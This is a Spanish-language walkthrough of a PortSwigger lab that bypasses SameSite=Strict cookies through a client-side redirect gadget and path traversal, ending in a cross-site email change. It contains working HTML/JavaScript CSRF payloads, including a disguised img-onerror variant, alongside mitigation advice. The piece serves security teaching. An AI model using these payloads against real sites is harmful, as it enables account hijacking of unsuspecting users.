
---
# Bypass de SameSite Strict mediante redirección cliente-side


## Introducción

Analizamos una implementación vulnerable al CSRF que aplica la política de cookies `SameSite=Strict`, una medida que bloquea el envío de cookies en peticiones cross-site. Sin embargo, veremos cómo una lógica de **redirección client-side basada en parámetros controlables** permite iniciar desde un dominio externo una petición GET autenticada a un endpoint sensible, conducente a un cambio de email sin interacción del usuario.

Este laboratorio es especialmente útil para entender cómo **pequeños errores en el frontend pueden neutralizar por completo defensas modernas en el backend**, incluso cuando dichas defensas están configuradas correctamente.

[Ver laboratorio Portswigger](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)


---

## Contexto

Tras iniciar sesión, el backend establece la cookie de sesión con:

```
Set-Cookie: session=<valor>; Secure; HttpOnly; SameSite=Strict
```

Por tanto, el navegador no debería enviar la cookie de sesión si la petición se origina desde un dominio externo.

Sin embargo, la app presenta un flujo de comentarios que incluye:

1. POST `/post/comment` → página de confirmación
    
2. JavaScript que redirige automáticamente pasado un tiempo
    
3. Redirección basada en `postId` contenido en la query string
    

El punto crítico es que **el valor de `postId` se usa directamente en la construcción del path dentro del dominio**, sin sanitización, y forzando una navegación top-level en el mismo origen, que sí permite enviar cookies bajo SameSite Strict.

---

## Análisis de peticiones

### Flujo legítimo de cambio de email (POST)

```
POST /my-account/change-email HTTP/1.1
Cookie: session=...
email=test%40mail.com&submit=1
```

Observaciones:

- No incluye CSRF tokens
    
- La operación puede ejecutarse autenticada sin validaciones adicionales
    
- Sin protección adicional, sería vulnerable si conseguimos forzar un request autenticado
    

---

### Intento de cambio mediante GET

Probamos a transformar la solicitud a GET:

```
GET /my-account/change-email?email=test@mail.com&submit=1
```

Respuesta:

```
HTTP/2 302 Found
Location: /login
Set-Cookie: session=...; SameSite=Strict
```

Interpretación pedagógica:

- El endpoint acepta GET
    
- Pero el navegador **no envía la cookie**, debido a SameSite Strict
    
- Por tanto, si la petición se origina desde otro sitio, terminamos no autenticados
    

---

## El gadget vulnerable

Tras crear un comentario se ejecuta JavaScript:

```javascript
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + '/' + postId;
    }, 3000);
}
```

Implicaciones:

- `postId` es controlado por el usuario
    
- Se concatena directamente a `blogPath`
    
- Provoca **redirección top-level dentro del mismo dominio**
    
- Chrome enviará cookies porque ya estamos en el "same site"
    

Esto es crucial: **SameSite Strict bloquea cookies en la primera petición cross-site**, pero **no en navegaciones posteriores dentro del mismo origen**.

---

## Explotación

### 1. Validación del gadget

Probamos:

```
/post/comment/confirmation?postId=../my-account
```

Resultado:

- Inicialmente vemos la página de confirmación
    
- Tras redirección, el navegador va a `/my-account`
    
- Importante: **mantiene la sesión**
    

Así confirmamos:

- Redirección se ejecuta autenticada
    
- Podemos inducir GET a cualquier endpoint del dominio
    

---

### 2. Ejecución de la acción vulnerable

Sabemos que GET a:

```
/my-account/change-email?email=test@mail.com&submit=1
```

cambia el email **si la cookie va incluida**.

Por tanto, construimos una redirección forzada:

```
/post/comment/confirmation?postId=../my-account/change-email?email=pwned@mail.com&submit=1
```

Problema: El `?` y el `&` rompen el valor de la query del primer request  
Solución: URL encode:

- `?` → `%3f`
    
- `&` → `%26`
    

---

## Payload

```html
<script>
    location="https://0a7600c00322086f85be7647007300ba.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email%3femail=prueba@mail.com%26submit=1";
</script>
```

Este script:

1. Se ejecuta en el dominio atacante
    
2. Fuerza una navegación cross-site a la página de confirmación
    
3. El navegador recibe HTML, ejecuta JavaScript del sitio
    
4. JS redirige internamente a `/my-account/...`
    
5. Ahora es navegación same-site → cookie incluida
    
6. El email cambia sin interacción del usuario
    

---

## Publicación y verificación

1. Guardamos el exploit en el servidor del lab
    
2. Pulsamos "**View exploit**"
    
3. Esperamos unos segundos para la redirección automática
    
4. Confirmamos que el email cambia
    
5. Modificamos el correo
    
6. Enviamos "**Deliver exploit to victim**"
    

Lab resuelto.

---

## Fundamentación

Este bypass no se basa en romper SameSite Strict, sino en **forzar el navegador a realizar un salto de contexto controlado**:

- Primera petición: cross-site, sin cookies (cumple política)
    
- Segunda petición: same-site, con cookies
    

La clave está en:

- Redirección **programática** dentro del DOM del sitio legítimo
    
- Parámetros controlables que permiten construir rutas arbitrarias
    
- Endpoint sensible sin CSRF tokens
    
- Aceptación del método GET para operaciones mutables
    

---

## Conclusión

Incluso aplicando **SameSite=Strict**:

- Los flujos internos pueden permitir abusos si no se valida la lógica de redirección
    
- Cualquier redirección client-side debe considerar sanitización estricta
    
- No se debe permitir ejecutar acciones sensibles con GET
    
- Faltan CSRF tokens
    

En esencia: **el frontend rompe la seguridad aplicada por el backend**.

---

## Mitigaciones

Backend:

1. Requerir **tokens CSRF impredecibles**
    
2. Requerir **POST/PUT** para acciones sensibles
    
3. Deshabilitar GET para mutaciones
    
4. Sanitizar parámetros usados para construir rutas
    
5. Validar server-side rutas permitidas
    
6. Rechazar rutas relativas `../`
    

Frontend:

1. No concatenar valores controlados por usuario en `window.location`
    
2. Normalizar y validar client-side
    
3. Evitar redirecciones automáticas en endpoints sensibles
    

---

## Payloads alternativos

### Usando `window.top.location`

```html
<script>
window.top.location="https://TARGET/post/comment/confirmation?postId=../my-account/change-email%3femail=x%40x.com%26submit=1";
</script>
```

### Camuflado

```html
<img src=x onerror="location='https://TARGET/post/comment/confirmation?postId=../my-account/change-email%3femail=x%40x.com%26submit=1'">
```

---

## Puntos pedagógicos clave

- SameSite Strict **no protege automáticamente contra ataques en múltiples saltos**
    
- La diferencia entre **cross-site navigation** y **subsequent same-site navigation** es crítica
    
- Los navegadores siguen reglas estrictas, pero los desarrolladores las rompen involuntariamente con:
    
    - redirecciones dinámicas
        
    - path traversal client-side
        
    - endpoints mutables en GET
        
- CSRF sigue existiendo en 2025 cuando:
    
    - no hay tokens
        
    - existe lógica de “gadget”
        
    - el navegador hace trabajo por el atacante
        

---

